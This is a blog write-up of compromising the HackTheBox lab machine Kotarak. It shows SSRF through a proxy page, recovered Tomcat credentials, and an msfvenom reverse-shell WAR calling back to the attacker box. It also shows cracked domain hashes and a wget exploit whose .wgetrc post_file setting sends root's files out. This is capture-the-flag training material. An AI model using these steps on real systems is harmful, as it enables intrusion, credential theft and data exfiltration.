<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>HackTheBox - Kotarak</title>
  <meta name="description" content="This machine was a surprise for me, in terms that it was not completely isolated and was having other machine communicating with it. In reality, the author s...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/pentesting/ctf/2018/03/09/HackTheBox-Kotarak.html">
  <link rel="alternate" type="application/rss+xml" title="...and another security blog" href="http://localhost:4000/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">...and another security blog</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">HackTheBox - Kotarak</h1>
    <p class="post-meta"><time datetime="2018-03-09T23:51:00-08:00" itemprop="datePublished">Mar 9, 2018</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>This machine was a surprise for me, in terms that it was not completely isolated and was having other machine communicating with it. In reality, the author seems to have simulated this external network interaction by using Linux Containers on the same machine, but the end result was great!</p>

<h2 id="web-enumeration">Web Enumeration</h2>

<p>I initiated my reconnaissance by scanning the machine with NMAP and default ports. Got back the TCP ports 22, 8009 and 8080. Running the scan again, now with the service version check (-sV), told me that I was dealing with an SSH server, a Tomcat and a Apache JServ, which was part of the Tomcat service. Going to <code>http://10.10.10.55:8080</code> showed a HTTP 404 error page. As this was a Tomcat website, I then went to /manager/html, which is the common admin section, but I got a HTTP basic authentication prompt. I was unable to brute force it using tools like Hydra, so I went on for more enumeration.</p>

<p>Further scanning on all possible ports, revealed that TCP 60000 was open too. This sounded interesting, so then I ran NMAP again to check the service and saw it was an Apache web server. Going to <code>http://10.10.10.55:60000</code>, showed a website called Kotarak Web Hosting Private Browser. This website had a form with a text box and a submit button. This sounded like some sort of proxy because when I submitted the form, with <code>http://127.0.0.1:8080</code> value in the text box, I got the same Tomcat error page from <code>http://10.10.10.55:8080</code>. The full request was <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:8080</code>. At that point, I was certain this was a proxy to internal resources on the same machine.</p>

<p>I decided to do more enumeration on the machine to see if I could find some information to use in the proxy. I ran a <code>dirb http://10.10.10.55:60000 /usr/share/wordlists/dirb/common.txt</code> and got a forbidden (403) response for the request <code>http://10.10.10.55/server-status</code>. I then used the proxy to bypass the forbidden response:</p>

<p><code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:60000/server-status</code></p>

<p>I got a Apache server status page with some information about HTTP requests received by this Apache proxy server. Some of these requests were to 127.0.0.1:888, so a new TCP port to explore. After opening <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888</code> in the browser, I get a webpage with title Simple File Viewer and a list of a few files. The list contained a file called backup, which is always interesting. The file was having a link to <code>http://10.10.10.55:60000/url.php?doc=backup</code>. The problem was that going to that URL, returned an empty page. I then thought using the proxy. Going to <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888/?doc=backup</code>, returned a XML page with old Tomcat credentials (I had to view the page source):</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"admin"</span> <span class="na">password=</span><span class="s">"3@g01PdhB!"</span> <span class="na">roles=</span><span class="s">"manager,manager-gui,admin-gui,manager-script"</span><span class="nt">/&gt;</span></code></pre></figure>

<h2 id="getting-a-shell">Getting a shell</h2>

<p>With these credentials, I was able to login into the Tomcat’s admin dashboard in <code>http://10.10.10.55:8080/manager/html</code>. I then generated a WAR package through MSFVenom:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;MY_ATTACK_BOX_IP&gt; <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="o">&gt;</span> warsh.war</code></pre></figure>

<p>Deployed the package and set a netcat listening on port 443 on my attacker box. After requesting the URL <code>http://10.10.10.55:8080/warsh</code>, I got a shell on the system, under the user tomcat. Here’s a few steps that I used that allowed me to get a fully capable shell, that was able to support tab completion and such:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
Control-Z <span class="o">(</span>this puts the shell into background<span class="o">)</span>
stty raw <span class="nt">-echo</span> <span class="o">(</span>on your attacker box<span class="o">)</span>
<span class="nb">fg</span> <span class="o">(</span>not visible<span class="o">)</span>
reset</code></pre></figure>

<h2 id="system-enumeration">System Enumeration</h2>

<p>The user tomcat didn’t have much privileges so at that point I started my enumeration to find ways to escalate privileges. I found out the /root directory was readable, so I could list its contents:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">tomcat@kotarak-dmz:/root<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 12
<span class="nt">-rw-------</span> 1 atanas root    333 Jul 20  2017 app.log
<span class="nt">-rw-------</span> 1 atanas root     66 Aug 29  2017 flag.txt</code></pre></figure>

<p>I could see an interesting file named app.log, but it was only readable by the user atanas. After some more enumeration, I found two interesting files in the folder /home/tomcat/to_archive/pentest_data:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 28304
<span class="nt">-rw-r--r--</span> 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<span class="nt">-rw-r--r--</span> 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin</code></pre></figure>

<p>These files are related to Active Directory. The .dit file, besides containing AD data, it contains the password hashes for all users in the domain. It is encrypted by a password, which is stored in the registry SYSTEM hive. Quickly I assumed the .bin file was the SYSTEM registry hive.</p>

<h2 id="password-cracking--privilege-escalation-i--more-system-enumeration">Password Cracking / Privilege Escalation I / More System Enumeration</h2>

<p>Using <a href="https://www.gracefulsecurity.com/extracting-password-hashes-from-a-domain-controller/">this</a> reference, I used the tool easbxtract.py to extract the password hashes in a format compatible with John the Ripper. I then ran the password cracker and found the password for user atanas:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>john <span class="nt">--show</span> hashes.pwdump <span class="nt">--format</span><span class="o">=</span>NT
Administrator:f16tomcat!
atanas:Password123!</code></pre></figure>

<p>I used su to try the password and strangely the one it worked for the user atanas was the one from the Administrator: <code>f16tomcat!</code>. Now I was able to read the app.log file:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">atanas@kotarak-dmz:/root<span class="nv">$ </span><span class="nb">cat </span>app.log
10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:48:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span>
10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:50:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span>
10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:52:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span></code></pre></figure>

<p>After looking at this information, I suspected there was some privilege escalation through wget. I checked exploit-db.com and found an <a href="https://www.exploit-db.com/exploits/40064/">Arbitrary File Upload/Remote Code Execution exploit</a> affecting versions below 1.18. Since the requests used version 1.16, this seemed a good thing to try.</p>

<p>I noticed the machine was having a network interface with the IP 10.0.3.1, so on the same subnet as the source IP of 10.0.3.133, from the app.log file. For the exploit to work, it needs to listen on the TCP port 80 and 21. This was problematic because the user atanas didn’t have permissions to open those privileged ports. At this point I was stuck and went for further enumeration. I spent a few days, finding other things that had no relation at all and showed to not be useful for the privilege escalation that I was trying to achieve. At that point I went to HackTheBox Slack channel, looking for some hints from people. So, I knew the exploit, I knew it was triggered by a request from an external machine. I was just hoping the request was coming from the root user, so the privilege escalation would be successful. At that point I got a hint from someone in the Slack channel, that advise me to look deeper into the /etc folder, that way I would find something that would help me to open privileged ports with an unprivileged user. With that information, I went on to /etc and found the authbind/ folder. This was certainly not a common folder in /etc, so I went ahead and listed its contents:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">atanas@kotarak-dmz:/etc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> authbind/<span class="k">*</span>
authbind/byaddr:
total 0

authbind/byport:
total 0
<span class="nt">-rwxr-xr-x</span> 1 root atanas 0 Aug 29  2017 21
<span class="nt">-rwxr-xr-x</span> 1 root atanas 0 Aug 29  2017 80

authbind/byuid:
total 0</code></pre></figure>

<p>Ok, so I could see the folder authbind/byport/ contained the empty files 80 and 21. These were exactly the ports I needed to open as an unprivileged user. I assumed this authbind thing would help me to open those ports and I was correct. Only the atanas user was able to execute the authbind binary:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">atanas@kotarak-dmz:~<span class="nv">$ </span>which authbind
/usr/bin/authbind
atanas@kotarak-dmz:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/authbind
<span class="nt">-rwx------</span> 1 atanas atanas 10464 Jul 26  2015 /usr/bin/authbind</code></pre></figure>

<p>I went ahead and tried to open a netcat listener on port 80 and I was successful:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">atanas@kotarak-dmz:~<span class="nv">$ </span>authbind nc <span class="nt">-nvlp</span> 80
Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 80<span class="o">)</span></code></pre></figure>

<h2 id="privilege-escalation-ii--own-system">Privilege Escalation II / Own System</h2>

<p>Now I was able to run the wget exploit. I changed the exploit code to listen on the IP 10.0.3.1 and connect to FTP server with same IP. This way, the exploit would only receive the intended request and not all the enumeration made by other HackTheBox users. I used scp to copy the exploit python file from my attacker box to the target machine. I also created a .wgetrc file with the content <code>post_file = /root/root.txt</code>. I then launched, in the target machine, a <code>python -m pyftpdlib -i 10.0.3.1 -p21 -w &amp;</code>. This was the FTP server the exploit redirected the request to download the .wgetrc. The exploit listened on port TCP 80, waited for the HTTP request from 10.0.3.133 to the /archive.tar.gz, it redirected the client to a FTP download of the .wgetrc with the post_file content. As the HTTP request was running periodically, it triggered again and used the newly .wgetrc, which was downloaded and copied into the folder of the user from the machine 10.0.3.133 (supposedly root). The request submitted a POST request with the contents of the /root/root.txt file, which contained the final hash flag.</p>


  </div>

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <!-- <h2 class="footer-heading">...and another security blog</h2> -->

    <div class="footer-col-wrapper">
	<!--
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li>...and another security blog</li>
          <li><a href="mailto:"></a></li>
        </ul>
      </div>
	-->

      <div class="footer-col footer-col-2">
        <ul class="social-media-list">
          

          
        </ul>
      </div>

      <div class="footer-col footer-col-3">
        <p>Adventures in the Infosec world.</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
